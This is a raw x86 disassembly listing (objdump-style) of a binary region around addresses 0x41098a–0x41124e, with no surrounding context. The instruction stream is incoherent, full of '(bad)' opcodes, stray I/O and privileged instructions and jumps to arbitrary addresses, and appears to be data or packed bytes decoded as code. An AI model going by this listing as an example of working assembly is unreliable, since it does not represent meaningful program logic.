  41098a:	xor    bl,BYTE PTR [eax+0x2]
  41098d:	push   ebp
  41098e:	jnp    0x41091c
  410990:	xchg   bl,al
  410992:	or     al,0xed
  410994:	mov    dl,0x67
  410996:	nop
  410997:	leave  
  410998:	ret    
  410999:	(bad)  
  41099a:	jmp    FWORD PTR ds:0x4efc303
  4109a0:	aas    
  4109a1:	out    0xb2,eax
  4109a3:	xchg   esp,eax
  4109a4:	pop    ecx
  4109a5:	(bad)  
  4109a6:	mov    bh,0xa2
  4109a8:	call   di
  4109ab:	pop    edi
  4109ac:	add    cl,BYTE PTR [ebp-0x184c33cb]
  4109b2:	jns    0x410a02
  4109b4:	pop    ecx
  4109b5:	(bad)  
  4109b6:	jae    0x410962
  4109b8:	data16 (bad) 
  4109ba:	cmp    al,0x8
  4109bc:	mov    DWORD PTR [esp+ebx*4-0x71],eax
  4109c0:	push   0x79
  4109c2:	loope  0x4109c4
  4109c4:	pop    ebx
  4109c5:	add    BYTE PTR [eax],0x0
	...
  4109d8:	sbb    eax,0xe97503fc
  4109dd:	loop   0x41099f
  4109df:	jmp    0x410a01
  4109e1:	or     bh,ch
  4109e3:	xor    BYTE PTR [edi-0x73837aa0],al
  4109e9:	push   es
  4109ea:	jmp    0xe8c175f9
  4109ef:	add    esi,eax
  4109f1:	sub    DWORD PTR [ebx],0x54
  4109f4:	mov    bh,0x51
  4109f6:	push   ebx
  4109f7:	push   0x5ac5df57
  4109fc:	push   esi
  4109fd:	test   eax,eax
  4109ff:	add    al,0xc5
  410a01:	shl    DWORD PTR [ebp-0x1b],cl
  410a04:	push   cs
  410a05:	enter  0x6ee8,0x98
  410a09:	dec    ecx
  410a0a:	sub    esp,DWORD PTR [eax-0x17]
  410a0d:	push   es
  410a0e:	jmp    0x810c4116
  410a13:	add    esi,eax
  410a15:	push   es
  410a16:	jmp    0x189fbea3
  410a1b:	pop    ebx
  410a1c:	pushf  
  410a1d:	bound  edx,QWORD PTR ds:0x75ac026c
  410a23:	pop    edx
  410a24:	cli    
  410a25:	inc    esi
  410a26:	hlt    
  410a27:	repz jb 0x4109fd
  410a2a:	push   eax
  410a2b:	add    edi,DWORD PTR [esp+edi*8+0x5d]
  410a2f:	rcl    bh,1
  410a31:	pop    edi
  410a32:	adc    DWORD PTR [ecx-0x1a],ebx
  410a35:	push   eax
  410a36:	popa   
  410a37:	cmp    ebx,esi
  410a39:	ficom  DWORD PTR [eax+0x6b]
	...
  410a4c:	add    BYTE PTR [eax],al
  410a4e:	push   es
  410a4f:	push   ss
  410a50:	ds pop edx
  410a52:	cli    
  410a53:	sub    edi,DWORD PTR [ebx+0x44d272f0]
  410a59:	add    eax,DWORD PTR [eax+eax*1+0x26]
  410a5d:	enter  0xdfd3,0x70
  410a61:	imul   BYTE PTR [edi-0x589ffb0]
  410a67:	push   es
  410a68:	jmp    0xe79d70db
  410a6d:	ret    0x1017
  410a70:	jmp    0x99445
  410a75:	push   0xe57406ea
  410a7a:	out    dx,al
  410a7b:	sub    esi,DWORD PTR [ebx-0x79]
  410a7e:	in     eax,0x2b
  410a80:	jae    0x410a7b
  410a82:	pop    ebp
  410a83:	add    BYTE PTR [ebp+0x67bfbc2c],cl
  410a89:	es sub eax,0x84d0ffc7
  410a8f:	retf   
  410a90:	(bad)  
  410a91:	mov    esi,0xc1ebdaa9
  410a96:	aam    0x1f
  410a98:	jmp    FWORD PTR [esi+0x425e456d]
  410a9e:	stos   DWORD PTR es:[edi],eax
  410a9f:	inc    esp
  410aa0:	push   esp
  410aa1:	jb     0x410a3b
  410aa3:	xchg   bl,al
  410aa5:	dec    ecx
  410aa6:	retf   0xfe50
  410aa9:	ss (bad) 
  410aab:	call   0x506db0ff
  410ab0:	idiv   bl
	...
  410ac2:	add    BYTE PTR [eax],al
  410ac4:	repnz inc ebx
  410ac6:	(bad)  
  410ac7:	ss mov bl,0x28
  410aca:	inc    ecx
  410acb:	jmp    0xf6411c43
  410ad0:	ja     0x410b0e
  410ad2:	add    cl,ch
  410ad4:	repz add DWORD PTR [ebp+ebx*2-0x4601aeb6],0xa12f67a0
  410ae0:	cmp    BYTE PTR [ecx+0xa],dl
  410ae3:	sub    ecx,edi
  410ae5:	mov    ah,BYTE PTR [ebx-0x7cf90c18]
  410aeb:	ins    BYTE PTR es:[edi],dx
  410aec:	and    BYTE PTR [edx-0x2],dl
  410aef:	es in  al,dx
  410af1:	inc    DWORD PTR [ebx+0x6f376]
  410af7:	fs daa 
  410af9:	test   al,0xfd
  410afb:	push   cs
  410afc:	cmp    eax,eax
  410afe:	inc    BYTE PTR [eax]
  410b00:	aam    0xb6
  410b02:	cld    
  410b03:	dec    DWORD PTR [esi+0x7e37ecdb]
  410b09:	scas   al,BYTE PTR es:[edi]
  410b0a:	sub    esi,esi
  410b0c:	adc    BYTE PTR [eax-0x5171015e],al
  410b12:	jmp    0xb63f124e
  410b17:	test   bh,ch
  410b19:	mov    ds:0x932efffc,al
  410b1e:	imul   sp,WORD PTR [edx],0x44
  410b22:	dec    BYTE PTR [esp+edx*8+0xfffcc9]
	...
  410b39:	add    BYTE PTR [esi-0x6d],bh
  410b3c:	out    0x41,al
  410b3e:	push   edx
  410b3f:	add    eax,DWORD PTR [eax]
  410b41:	add    DWORD PTR [ebp+0x5b858d07],0xffffffad
  410b48:	std    
  410b49:	(bad)  
  410b4a:	jmp    0x6fe5befc
  410b4f:	scas   al,BYTE PTR es:[edi]
  410b50:	std    
  410b51:	call   0x4002cc
  410b56:	adc    al,0xa2
  410b59:	(bad)  
  410b5a:	jle    0x410b0a
  410b5c:	inc    esp
  410b5d:	or     DWORD PTR [edi-0x713b8fad],0xffffff80
  410b64:	repnz dec BYTE PTR [esi-0x51]
  410b68:	out    0xb4,al
  410b6a:	or     esi,DWORD PTR [eax+0x7254c7fd]
  410b70:	cld    
  410b71:	jmp    FWORD PTR [esi]
  410b73:	or     al,BYTE PTR [eax]
  410b75:	add    cl,bl
  410b77:	pop    esp
  410b78:	add    BYTE PTR [ebp-0x38dac],cl
  410b7e:	push   cs
  410b7f:	call   0xfffd:0xafd5b5fd
  410b86:	add    DWORD PTR [eax+0x2f],edx
  410b89:	push   eax
  410b8b:	hlt    
  410b8c:	or     eax,eax
  410b8e:	out    dx,eax
  410b8f:	jecxz  0x410beb
  410b91:	call   DWORD PTR [edi+0x48bc8160]
  410b97:	dec    esi
  410b98:	push   esi
  410b99:	(bad)  
  410b9a:	xor    eax,0x27a
	...
  410baf:	add    bh,ch
  410bb1:	loop   0x410c1d
  410bb3:	push   DWORD PTR [edi+0x60]
  410bb6:	xchg   DWORD PTR [ebx+ebp*2-0x3f01a9d2],eax
  410bbd:	(bad)  
  410bbe:	inc    DWORD PTR [eax]
  410bc0:	lock pop edi
  410bc2:	push   0xffffffe3
  410bc4:	jmp    0x304c0e28
  410bc9:	pop    ebp
  410bca:	jle    0x410b9a
  410bcc:	lock pop edi
  410bce:	add    bh,BYTE PTR ds:0x25ef4
  410bd4:	out    0xdc,eax
  410bd6:	aas    
  410bd7:	jmp    FWORD PTR [edi]
  410bd9:	pusha  
  410bda:	push   0x4f
  410bdc:	cli    
  410bdd:	pop    edi
  410bde:	add    dl,BYTE PTR [eax-0x78]
  410be1:	add    ecx,ebx
  410be3:	inc    eax
  410be4:	lock rol BYTE PTR [eax+0x56cd0ec1],cl
  410beb:	dec    edi
  410bec:	sbb    BYTE PTR [ecx+ecx*1+0x3fe0f000],bh
  410bf3:	or     ecx,DWORD PTR [edx-0x147b78a1]
  410bf9:	lods   eax,DWORD PTR ds:[esi]
  410bfa:	push   esi
  410bfb:	inc    BYTE PTR [eax-0x38]
  410bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bff:	or     al,dh
  410c01:	pop    edi
  410c02:	xchg   DWORD PTR [ebx+ebx*8+0x20fe56c5],eax
  410c09:	mov    eax,0x14c74313
  410c0e:	or     eax,eax
  410c10:	inc    ebp
  410c11:	add    ah,ch
  410c13:	fld    QWORD PTR [eax]
	...
  410c25:	add    BYTE PTR [eax],cl
  410c27:	pop    es
  410c28:	test   al,0x3
  410c2a:	jge    0x410baf
  410c2c:	and    DWORD PTR [esi-0x5a],edx
  410c2f:	dec    ebp
  410c30:	mov    eax,0xe11a86b
  410c35:	push   edi
  410c36:	fs jae 0x410c63
  410c39:	push   esi
  410c3a:	mov    cs,WORD PTR [ebp-0x66]
  410c3d:	mov    bl,0x8f
  410c3f:	div    BYTE PTR [esi+edx*2-0x77269e82]
  410c46:	ins    BYTE PTR es:[edi],dx
  410c47:	dec    eax
  410c48:	out    0x56,al
  410c4a:	outs   dx,BYTE PTR ds:[esi]
  410c4b:	mov    dh,0x6b
  410c4d:	sub    BYTE PTR [edx+0x4c],0xd5
  410c51:	push   esi
  410c52:	scas   eax,DWORD PTR es:[edi]
  410c53:	pop    esi
  410c54:	test   DWORD PTR [edx],ebx
  410c56:	push   edi
  410c57:	dec    ebp
  410c58:	outs   dx,DWORD PTR ds:[esi]
  410c59:	or     BYTE PTR [ebx+0x4656bd4c],0x93
  410c60:	je     0x410cb7
  410c62:	ds dec ebp
  410c64:	lods   eax,DWORD PTR ds:[esi]
  410c65:	nop
  410c66:	inc    ebx
  410c67:	dec    esp
  410c68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c69:	push   esi
  410c6a:	pop    ss
  410c6b:	rcr    cl,cl
  410c6d:	push   esi
  410c6e:	add    DWORD PTR es:[ecx+0x18dee2cf],ebp
  410c75:	retf   
  410c76:	mov    al,0x6
  410c78:	xchg   ecx,eax
  410c79:	pop    esi
  410c7a:	test   DWORD PTR [esi],0xd68fb3e9
  410c80:	and    ebp,eax
  410c82:	dec    DWORD PTR [ebx+0x33]
  410c85:	lahf   
  410c86:	cmc    
  410c87:	dec    esp
  410c88:	imul   eax,DWORD PTR gs:[eax],0x0
	...
  410c9c:	out    0xc8,al
  410c9e:	pop    ebp
  410c9f:	push   esi
  410ca0:	pop    ecx
  410ca1:	push   es
  410ca2:	ret    
  410ca3:	add    ecx,DWORD PTR [edx+0x7]
  410ca6:	dec    esi
  410ca7:	nop
  410ca8:	fwait
  410ca9:	dec    ebp
  410caa:	inc    ebp
  410cab:	push   esi
  410cac:	push   edi
  410cad:	fisttp WORD PTR [edi]
  410caf:	(bad)
  410cb2:	(bad)  
  410cb3:	call   0xe94ad503
  410cb8:	repz dec ebx
  410cba:	mov    ah,0x65
  410cbc:	inc    ebp
  410cbd:	dec    ebp
  410cbe:	(bad)  
  410cbf:	adc    DWORD PTR [esi+0x15],ecx
  410cc2:	call   DWORD PTR [esi]
  410cc4:	inc    esi
  410cc5:	xchg   ebx,eax
  410cc6:	mov    ds:0xe74d3e0f,eax
  410ccb:	dec    ebp
  410ccc:	dec    BYTE PTR [ebx-0x2]
  410ccf:	(bad)  
  410cd0:	ja     0x410d2a
  410cd2:	std    
  410cd3:	mul    BYTE PTR ds:0x1ebe0564
  410cd9:	dec    ebp
  410cda:	sti    
  410cdb:	sbb    dh,BYTE PTR [esi+ecx*4+0x4cbddefe]
  410ce2:	icebp  
  410ce3:	xchg   esp,edi
  410ce5:	add    ecx,DWORD PTR [edi]
  410ce7:	fs out 0x4c,eax
  410cea:	inc    dh
  410cec:	xchg   BYTE PTR [ebp-0x7e685538],ch
  410cf2:	jmp    0x410d5e
  410cf4:	mov    al,0x5b
  410cf6:	addr16 in al,dx
  410cf8:	ror    BYTE PTR [ebx],cl
  410cfa:	add    BYTE PTR [ecx-0x613cf8be],ah
	...
  410d10:	add    BYTE PTR [eax],al
  410d12:	jns    0x410d4a
  410d14:	addr16 in al,dx
  410d16:	repnz push es
  410d18:	add    BYTE PTR [ecx-0x7900eac2],al
  410d1e:	jns    0x410d56
  410d20:	mov    BYTE PTR [eax+ebp*4],ah
  410d23:	adc    cl,0x1
  410d26:	inc    DWORD PTR [esi]
  410d28:	add    cl,ch
  410d2a:	mov    ebx,edx
  410d2c:	ss inc bp
  410d2f:	adc    ecx,0x675ba770
  410d35:	in     al,dx
  410d36:	repnz push es
  410d38:	add    BYTE PTR [ecx-0x62],al
  410d3b:	adc    al,0xff
  410d3d:	add    BYTE PTR [esi],dh
  410d3f:	jle    0x410d11
  410d41:	mov    ebp,ebx
  410d43:	jg     0x410d88
  410d45:	clc    
  410d46:	push   edx
  410d47:	sbb    DWORD PTR [edx-0xb44e2e],ecx
  410d4d:	call   FWORD PTR [ecx-0x7c038c4e]
  410d53:	pop    es
  410d54:	call   0x489d74
  410d59:	mov    ebx,ebx
  410d5b:	jge    0x410d2d
  410d5d:	dec    DWORD PTR [eax+edi*4]
  410d60:	data16 add al,0x98
  410d63:	pop    es
  410d64:	add    al,ch
  410d66:	add    eax,DWORD PTR [eax]
  410d68:	add    BYTE PTR [eax],al
  410d6a:	xchg   edx,eax
  410d6b:	(bad)  
  410d6c:	jb     0x410d7d
  410d6e:	loop   0x410d85
  410d70:	addr16 jne 0x410d95
  410d73:	dec    eax
  410d74:	(bad)  
  410d75:	inc    BYTE PTR [eax]
	...
  410d87:	add    BYTE PTR [edx+esi*4+0x75131e6],bh
  410d8e:	add    BYTE PTR [ebx+0x69fe5d6b],cl
  410d94:	pop    ecx
  410d95:	pop    ebp
  410d96:	add    BYTE PTR [edx+0x49],ch
  410d99:	pop    ebp
  410d9a:	add    DWORD PTR [eax+0x49],ebp
  410d9d:	pop    es
  410d9e:	add    al,al
  410da0:	push   esi
  410da1:	cmp    al,0xee
  410da3:	call   0x3f580d
  410da8:	nop
  410da9:	mov    edx,?
  410dab:	inc    eax
  410dac:	adc    al,bh
  410dae:	jae    0x410df4
  410db0:	jbe    0x410dee
  410db2:	cli    
  410db3:	(bad)  
  410db4:	cld    
  410db5:	mov    dh,0xe6
  410db7:	dec    DWORD PTR [esi]
  410db9:	pop    es
  410dba:	add    BYTE PTR [edx-0x1b],ch
  410dbd:	pusha  
  410dbe:	(bad)  
  410dbf:	dec    ah
  410dc1:	mov    dh,0xe6
  410dc3:	jae    0x410da5
  410dc5:	push   es
  410dc6:	add    BYTE PTR [ebx],cl
  410dc8:	lock pop ds
  410dca:	iret   
  410dcb:	or     esi,DWORD PTR [eax]
  410dcd:	dec    eax
  410dce:	int    0x4a
  410dd0:	xor    DWORD PTR [eax-0x4e],esp
  410dd3:	out    0xd3,eax
  410dd5:	popa   
  410dd6:	add    al,BYTE PTR [eax]
  410dd8:	dec    edx
  410dd9:	pusha  
  410dda:	call   0xe89f57de
  410ddf:	call   FWORD PTR [ecx]
  410de1:	pop    ebp
  410de2:	jmp    0x25fe:0x4260a7ff
  410de9:	lock push 0xffffff95
	...
  410dfc:	add    BYTE PTR [eax],al
  410dfe:	out    dx,eax
  410dff:	pop    edi
  410e00:	add    cl,BYTE PTR [ecx+0x73c14c35]
  410e06:	sbb    edi,DWORD PTR [eax-0x2b]
  410e09:	dec    edx
  410e0a:	xor    DWORD PTR [eax+0x6a],esp
  410e0d:	popf   
  410e0e:	out    dx,eax
  410e0f:	pop    edi
  410e10:	add    dl,BYTE PTR [eax-0x28]
  410e13:	loop   0x410dd3
  410e15:	inc    eax
  410e16:	lock sub al,bl
  410e19:	repz dec eax
  410e1b:	mov    ds:0x1057ff14,al
  410e20:	push   ebx
  410e21:	je     0x410e67
  410e23:	cmp    dh,cl
  410e25:	push   es
  410e26:	lock pop edi
  410e28:	stos   BYTE PTR es:[edi],al
  410e29:	or     dh,BYTE PTR [eax]
  410e2b:	or     eax,DWORD PTR [esi]
  410e2d:	jmp    0x410de2
  410e2f:	cwde   
  410e30:	fdivr  st,st(3)
  410e32:	cwde   
  410e33:	call   0xf7d8:0x68f040be
  410e3a:	or     BYTE PTR [ebx+edi*8+0x47dd17ff],ch
  410e41:	or     ebx,DWORD PTR [eax-0xfbf4160]
  410e47:	ja     0x410ddd
  410e49:	push   es
  410e4a:	lock pop edi
  410e4c:	std    
  410e4d:	mov    edi,0xd0da3d7c
  410e52:	cmp    eax,DWORD PTR [edi]
  410e54:	test   al,0x3
  410e56:	inc    eax
  410e57:	pop    edi
  410e58:	nop
  410e59:	or     esi,eax
  410e5b:	push   es
  410e5c:	loop   0x410ea1
  410e5e:	arpl   si,si
  410e60:	ret    0x3
	...
  410e73:	add    BYTE PTR [edx+0x7],bl
  410e76:	inc    esi
  410e77:	fnstcw WORD PTR [edi+0x5753b349]
  410e7d:	(bad)  
  410e7f:	les    esi,FWORD PTR [edi-0x40ad1721]
  410e85:	dec    ecx
  410e86:	fwait
  410e87:	dec    edi
  410e88:	(bad)  
  410e89:	pop    ss
  410e8a:	xlat   BYTE PTR ds:[ebx]
  410e8b:	push   edx
  410e8c:	sahf   
  410e8d:	dec    ecx
  410e8e:	fwait
  410e8f:	push   ebx
  410e90:	(bad)  
  410e91:	pop    ds
  410e92:	xlat   BYTE PTR ds:[ebx]
  410e93:	push   edx
  410e94:	mov    cs,WORD PTR [ecx+0x7b]
  410e97:	dec    ebx
  410e98:	(bad)  
  410e99:	daa    
  410e9a:	mov    bh,0x52
  410e9c:	jle    0x410edd
  410e9e:	sub    DWORD PTR [ebx+0x664bdf22],edi
  410ea4:	das    
  410ea5:	pop    es
  410ea6:	loope  0x410e7d
  410ea8:	lock inc ebp
  410eaa:	fisttp QWORD PTR [esi+0x3e906f0]
  410eb0:	xchg   edi,eax
  410eb1:	add    ebx,DWORD PTR ds:0xe7df4fc5
  410eb7:	mov    edx,0x5324974f
  410ebc:	ds and eax,0x47024f91
  410ec2:	outs   dx,DWORD PTR ds:[esi]
  410ec3:	push   edx
  410ec4:	cs dec ecx
  410ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ec7:	push   ebp
  410ec8:	push   ebp
  410ec9:	push   cs
  410eca:	out    0xd8,al
  410ecc:	pop    ss
  410ecd:	jge    0x410e78
  410ecf:	scas   al,BYTE PTR es:[edi]
  410ed0:	mov    dh,0x45
  410ed2:	xor    edi,DWORD PTR [edi+0x1b]
  410ed5:	test   DWORD PTR [ebx+edx*2+0x0],ebp
	...
  410ee8:	add    BYTE PTR [eax],al
  410eea:	mov    ds:0xbf6593de,al
  410eef:	push   es
  410ef0:	add    BYTE PTR [ecx+0x1d],dh
  410ef3:	push   es
  410ef4:	ret    
  410ef5:	outs   dx,BYTE PTR ds:[esi]
  410ef6:	jbe    0x410f03
  410ef8:	not    DWORD PTR [edi]
  410efa:	lods   eax,DWORD PTR ds:[esi]
  410efb:	dec    eax
  410efc:	(bad)  
  410efd:	aad    0xe5
  410eff:	test   DWORD PTR [esi+edx*2],edi
  410f02:	adc    esi,eax
  410f04:	(bad)  
  410f05:	call   0x4c40eb1
  410f0a:	out    dx,eax
  410f0b:	pop    ss
  410f0c:	inc    ecx
  410f0d:	jmp    0x245e105
  410f12:	sub    al,0xad
  410f14:	enter  0xe2a,0x2c
  410f18:	out    0xcd,eax
  410f1a:	cli    
  410f1b:	push   es
  410f1c:	add    BYTE PTR [eax+ebx*2+0x4c],ch
  410f20:	push   ecx
  410f21:	sbb    DWORD PTR [ebx+0x2af4feb8],0x1a
  410f28:	inc    ecx
  410f29:	jmp    0x654f97b4
  410f2e:	add    ecx,DWORD PTR [eax-0x2]
  410f31:	jmp    0xea38d260
  410f36:	repz push es
  410f38:	add    BYTE PTR [edi+ebp*1+0x50],dh
  410f3c:	dec    edi
  410f3d:	push   ebx
  410f3e:	hlt    
  410f3f:	fdiv   st(7),st
  410f41:	inc    edx
  410f42:	repz inc edi
  410f44:	je     0x410f13
  410f46:	mov    eax,ds:0x3317fef2
  410f4b:	dec    eax
  410f4c:	or     DWORD PTR [ecx+0x0],ebp
	...
  410f5e:	add    BYTE PTR [eax],al
  410f60:	daa    
  410f61:	fsubrp st(7),st
  410f63:	cmp    ecx,ebp
  410f65:	push   es
  410f66:	add    BYTE PTR [edx-0x44],ch
  410f69:	int    0x74
  410f6b:	or     DWORD PTR [ebp-0x35],ebp
  410f6e:	imul   ecx
  410f70:	inc    edi
  410f71:	scas   al,BYTE PTR es:[edi]
  410f72:	(bad)  
  410f73:	sbb    al,0xa4
  410f75:	pop    edi
  410f76:	jg     0x410f4c
  410f78:	mov    al,ds:0xd4008848
  410f7d:	scas   al,BYTE PTR es:[edi]
  410f7e:	mov    eax,DWORD PTR [ebp+0x71]
  410f81:	xchg   ebx,eax
  410f82:	std    
  410f83:	jne    0x410f06
  410f85:	mov    ch,0x73
  410f87:	hlt    
  410f88:	repz add edi,edi
  410f8b:	jne    0x410fda
  410f8d:	mov    dh,0x13
  410f8f:	(bad)  
  410f90:	out    dx,eax
  410f91:	inc    ebx
  410f92:	dec    BYTE PTR [edx]
  410f94:	or     DWORD PTR [edi],ebp
  410f96:	sub    al,0x8b
  410f98:	xchg   esp,eax
  410f99:	scas   eax,DWORD PTR es:[edi]
  410f9a:	mov    DWORD PTR [eax],edx
  410f9c:	cmp    al,0x40
  410f9e:	out    dx,al
  410f9f:	push   eax
  410fa0:	pop    ebx
  410fa1:	mov    dh,0x13
  410fa3:	add    ebp,esi
  410fa5:	inc    ebx
  410fa6:	dec    BYTE PTR [edx]
  410fa8:	fldcw  WORD PTR [esi]
  410faa:	sbb    BYTE PTR [eax-0x2f],ch
  410fad:	mov    DWORD PTR [edi],edi
  410faf:	add    dh,bh
  410fb1:	das    
  410fb2:	out    dx,al
  410fb3:	call   0x410cab
  410fb8:	xchg   edx,eax
  410fb9:	ret    
  410fba:	jae    0x410fbd
  410fbc:	pop    edx
  410fbd:	mov    dh,0x73
  410fbf:	lock loope 0x410fb1
  410fc2:	add    eax,0x0
	...
  410fd3:	add    BYTE PTR [eax],al
  410fd5:	add    BYTE PTR [ecx-0xe0b8c4a],cl
  410fdb:	dec    ebp
  410fdc:	xor    edi,edi
  410fde:	dec    esi
  410fdf:	mov    dh,0x73
  410fe1:	cld    
  410fe2:	inc    ecx
  410fe3:	inc    BYTE PTR ds:0xc1ca4900
  410fe9:	pop    ebx
  410fea:	nop
  410feb:	ret    0x8b53
  410fee:	sbb    eax,0x7fc0c284
  410ff3:	mov    dh,0xfd
  410ff5:	push   ebx
  410ff6:	mov    cl,0x78
  410ff8:	loope  0x41103a
  410ffa:	sbb    DWORD PTR [ebx-0x49a5fe90],edi
  411000:	cmp    DWORD PTR ds:0x40ec41,0x1ad65df0
  41100a:	jae    0x411046
  41100c:	push   ds
  41100d:	sub    DWORD PTR [ecx-0x1d8bfda3],esi
  411013:	fmul   QWORD PTR ds:0x41ec6f7
  411019:	add    BYTE PTR [edi+eiz*1-0x7d],ah
  41101d:	cmp    al,0xeb
  41101f:	push   ds
  411020:	ret    
  411021:	(bad)  
  411022:	fistp  WORD PTR [ebx+0x5]
  411025:	sub    esi,DWORD PTR [eax+0x1bc23979]
  41102b:	stc    
  41102c:	dec    edi
  41102d:	adc    al,0x18
  41102f:	pop    ss
  411030:	ret    
  411031:	jmp    FWORD PTR [eax+0x6b]
  411034:	push   esi
  411035:	(bad)  
  411036:	ins    DWORD PTR es:[edi],dx
  411037:	in     al,dx
  411038:	push   eax
  411039:	inc    BYTE PTR [eax]
	...
  41104b:	add    BYTE PTR [edi-0xffffcf8],ch
  411051:	cdq    
  411052:	add    ch,BYTE PTR [edx-0xe]
  411055:	pop    ss
  411056:	call   0x8ff7:0x832ff005
  41105d:	xchg   BYTE PTR gs:0x89022ff1,bl
  411064:	jne    0x41105e
  411066:	push   eax
  411067:	(bad)  
  411068:	ja     0x411015
  41106a:	test   ebx,ecx
  41106c:	outs   dx,BYTE PTR ds:[esi]
  41106d:	xor    eax,0xa3674f4e
  411072:	cmp    edi,ebp
  411074:	pop    edi
  411075:	gs pop ebx
  411077:	(bad)  
  411078:	out    dx,al
  411079:	das    
  41107a:	add    cl,BYTE PTR [ebx]
  41107c:	xor    BYTE PTR [ebp-0x7a],ah
  41107f:	repnz lock das 
  411082:	add    ch,BYTE PTR [eax+0x4b]
  411085:	stc    
  411086:	(bad)  
  411087:	jmp    DWORD PTR [ebx+esi*4+0x53]
  41108b:	std    
  41108c:	das    
  41108d:	jne    0x411042
  41108f:	out    0x1,eax
  411091:	pop    es
  411092:	out    dx,al
  411093:	add    esi,eax
  411095:	adc    DWORD PTR [ecx-0x17b58c01],ebp
  41109b:	add    esi,eax
  41109d:	dec    ebp
  41109e:	arpl   WORD PTR [eax+0x5],cx
  4110a1:	inc    esi
  4110a2:	test   DWORD PTR [eax+esi*8],eax
  4110a5:	push   es
  4110a6:	jmp    0x768c7d2b
  4110ab:	dec    edi
  4110ac:	out    dx,al
  4110ad:	(bad)  
  4110ae:	ins    DWORD PTR es:[edi],dx
  4110af:	cdq    
	...
  4110c0:	add    BYTE PTR [eax],al
  4110c2:	ret    
  4110c3:	inc    esp
  4110c4:	gs dec edi
  4110c6:	ficomp WORD PTR [ebx]
  4110c8:	or     eax,0x6207311d
  4110cd:	jns    0x411082
  4110cf:	inc    esp
  4110d0:	dec    ebp
  4110d1:	dec    edi
  4110d2:	cli    
  4110d3:	inc    esi
  4110d4:	cmc    
  4110d5:	xchg   DWORD PTR [edi+0x6],esp
  4110d8:	jmp    0x3d1d0be0
  4110dd:	push   DWORD PTR [ebp+edx*4-0x18]
  4110e1:	add    esi,eax
  4110e3:	inc    ebp
  4110e4:	pop    ebx
  4110e5:	cmp    BYTE PTR [ebp-0x6825e2bb],bl
  4110eb:	lods   eax,DWORD PTR ds:[esi]
  4110ec:	call   0x14a00f4
  4110f1:	and    esi,ebp
  4110f3:	push   es
  4110f4:	jmp    0x7ffb50f3
  4110f9:	jl     0x411127
  4110fb:	aas    
  4110fc:	arpl   cx,cx
  4110fe:	imul   edx,esi,0xffffff80
  411101:	pop    edx
  411102:	lock or cl,ch
  411105:	dec    esi
  411106:	in     al,0x3e
  411108:	(bad)  
  41110a:	pop    esi
  41110b:	hlt    
  41110c:	daa    
  41110d:	add    al,0xfb
  41110f:	inc    esi
  411110:	push   esp
  411111:	lods   al,BYTE PTR ds:[esi]
  411112:	inc    esi
  411113:	mov    ebx,0x41e44ec4
  411118:	push   cs
  411119:	lds    esi,FWORD PTR [edi]
  41111b:	adc    BYTE PTR [eax],al
  41111d:	test   eax,0xa642fe47
  411122:	js     0x4110a9
  411124:	std    
  411125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  411136:	add    BYTE PTR [eax],al
  411138:	scas   al,BYTE PTR es:[edi]
  411139:	inc    ebp
  41113a:	(bad)  
  41113b:	jmp    0xa9c5a533
  411140:	mov    ebp,0x2439fe44
  411145:	add    al,0x0
  411147:	div    bl
  411149:	cs pop esi
  41114b:	out    0xf3,eax
  41114d:	push   es
  41114e:	or     ebp,DWORD PTR [ecx+0x2c831bc8]
  411154:	xor    eax,DWORD PTR [edx-0x2]
  411157:	repz mov dx,0x5e0b
  41115c:	js     0x4110e2
  41115e:	std    
  41115f:	push   esi
  411160:	ds xchg ebp,eax
  411162:	add    al,0xbc
  411164:	in     al,0xc5
  411166:	call   DWORD PTR [ecx-0x1e]
  411169:	das    
  41116a:	sbb    DWORD PTR [esi],edi
  41116c:	cwde   
  41116d:	inc    eax
  41116e:	out    0x7d,eax
  411170:	test   DWORD PTR [esi],0x3cc82e00
  411176:	out    0x55,eax
  411178:	test   DWORD PTR [esi],0x459b1200
  41117e:	je     0x411191
  411180:	sub    esp,DWORD PTR [esi+0x3]
  411183:	jmp    0x35c5a37b
  411188:	sub    eax,0x2699fe45
  41118d:	jnp    0x411156
  41118f:	idiv   DWORD PTR [ebp-0x7ba18bc]
  411195:	push   es
  411196:	add    al,dl
  411198:	test   DWORD PTR [ebx-0x2],0xde
	...
  4111ab:	add    BYTE PTR [eax],al
  4111ad:	add    BYTE PTR [ebp-0x42283886],ah
  4111b3:	inc    esp
  4111b4:	out    0x69,eax
  4111b6:	clc    
  4111b7:	push   es
  4111b8:	add    BYTE PTR [eax],al
  4111ba:	ret    0x59c5
  4111bd:	leave  
  4111be:	mov    bh,BYTE PTR [ecx+ecx*4-0x14]
  4111c2:	call   0xe514:0xb153dece
  4111c9:	inc    eax
  4111ca:	or     eax,edx
  4111cc:	jo     0x4111cf
  4111ce:	dec    edx
  4111cf:	rol    BYTE PTR [ecx+0x41255e3d],cl
  4111d5:	add    BYTE PTR [ecx],bl
  4111d7:	pop    esp
  4111d8:	pop    es
  4111d9:	xor    DWORD PTR [edi+eax*8],0x2c
  4111dd:	inc    ecx
  4111de:	or     DWORD PTR [eax],ecx
  4111e0:	jne    0x4111e7
  4111e2:	mov    dl,0xc7
  4111e4:	pop    ecx
  4111e5:	leave  
  4111e6:	call   0x7:0xc9fc43c9
  4111ed:	add    BYTE PTR [esi],cl
  4111ef:	dec    esp
  4111f0:	test   BYTE PTR [eax],0xd9
  4111f3:	pop    es
  4111f4:	add    bh,al
  4111f6:	mov    ebx,fs
  4111f8:	(bad)  
  4111f9:	dec    ecx
  4111fb:	pop    es
  4111fc:	mov    DWORD PTR [ebp-0x3],0x9900000a
  411203:	retf   0xf043
  411206:	cdq    
  411207:	pop    es
  411208:	add    BYTE PTR [eax],al
  41120a:	and    al,0x4c
  41120c:	out    dx,al
  41120d:	push   eax
  41120e:	add    al,0x4c
  411210:	repnz push eax
	...
  411222:	add    BYTE PTR [eax],al
  411224:	adc    al,0x4c
  411226:	jmp    0xf545:0x8bd27350
  41122d:	jp     0x411297
  41122f:	add    ah,BYTE PTR [ebx+0x6]
  411232:	push   0x0
  411234:	data16 cmp al,0xc5
  411237:	cs cwde 
  411239:	pop    es
  41123a:	mov    DWORD PTR [ebp+0x41],eax
  41123d:	xchg   BYTE PTR [ebx-0x18],bh
  411240:	dec    ecx
  411241:	pop    ebx
  411242:	pop    es
  411243:	xor    eax,0xf0e95bda
  411249:	sub    eax,0x4cc47502
  41124e:	aad    0xfb
